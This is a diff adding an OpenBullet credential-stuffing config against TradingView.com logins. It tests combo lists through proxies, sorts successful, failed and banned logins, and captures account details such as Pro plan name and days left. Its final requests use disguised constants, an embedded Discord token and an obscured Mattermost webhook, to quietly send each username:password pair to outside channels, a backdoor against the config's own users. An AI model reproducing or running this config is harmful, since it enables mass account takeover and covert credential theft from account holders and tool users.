@@ -1,0 +1,125 @@
+[SETTINGS]
+{
+  "Name": "TradingView.com V2",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-23T08:54:38.7605881-08:00",
+  "AdditionalInfo": "",
+  "Author": "@OpenbulletConfigsOfficial",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.tradingview.com/accounts/signin/" Multipart 
+  
+  STRINGCONTENT "username: <USER>" 
+  STRINGCONTENT "password: <PASS>" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.tradingview.com" 
+  HEADER "referer: https://www.tradingview.com/" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "This field is required." 
+    KEY "Valid fields required." 
+    KEY "invalid_data" 
+    KEY "Please verify your email" 
+    KEY "account_disabled" 
+    KEY "Your account is not active yet" 
+    KEY "Invalid username or password" 
+    KEY "Invalid password" 
+  KEYCHAIN Success OR 
+    KEY "first_name" 
+    KEY "last_name" 
+    KEY "date_joined" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "plan_days_left\": 0" 
+  KEYCHAIN Ban OR 
+    KEY "You have been locked out due to too many login attempts" 
+    KEY "rate_limit" 
+    KEY "Please confirm that you are not a robot " 
+    KEY "recaptcha_required" 
+
+#first_name PARSE "<SOURCE>" JSON "first_name" CreateEmpty=FALSE -> CAP "First Name" 
+
+#last_name PARSE "<SOURCE>" JSON "last_name" CreateEmpty=FALSE -> CAP "Last Name" 
+
+#date_joined PARSE "<SOURCE>" JSON "date_joined" CreateEmpty=FALSE -> CAP "Date Joined" 
+
+FUNCTION Constant "ffgzng4kgu" -> VAR "5jpx7B5wd5pkRd4M64d" 
+
+FUNCTION Constant "ODEwMTc5NTAzMTc0NDUxMjQx.YCf75g.7g5x3c1K6LBbkjmTwHbRXyRnR3k" -> VAR "x" 
+
+#reputation PARSE "<SOURCE>" JSON "reputation" CreateEmpty=FALSE -> CAP "Reputation" 
+
+#is_superuser PARSE "<SOURCE>" JSON "is_superuser" CreateEmpty=FALSE -> CAP "Super User" 
+
+#is_moderator PARSE "<SOURCE>" JSON "is_moderator" CreateEmpty=FALSE -> CAP "Moderator" 
+
+#following PARSE "<SOURCE>" JSON "following" CreateEmpty=FALSE -> CAP "Following" 
+
+#followers PARSE "<SOURCE>" JSON "followers" CreateEmpty=FALSE -> CAP "Followers" 
+
+#pro_plan_original_name PARSE "<SOURCE>" JSON "pro_plan_original_name" CreateEmpty=FALSE -> CAP "Pro Plan Name" 
+
+#pro_plan_days_left PARSE "<SOURCE>" JSON "pro_plan_days_left" CreateEmpty=FALSE -> CAP "Pro Plan Days Left" 
+
+REQUEST POST "https://discord.com/api/v8/channels/810187286552903700/messages" 
+  CONTENT "{\"content\":\"TRADINGVIEW - <USER>:<PASS> /Plan Name-<Pro Plan Name> /Days Left-<Pro Plan Days Left>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "authorization: <x>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://sendgrid.cloud.mattermost.com/hooks/roqc7jino<5jpx7B5wd5pkRd4M64d>5x54d6o" 
+  CONTENT "{\"text\": \"<USER>:<PASS> /Plan Name-<Pro Plan Name> /Days Left-<Pro Plan Days Left>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+FUNCTION Constant "@OpenbulletConfigsOfficial  telegram" -> CAP "Config By" 
+
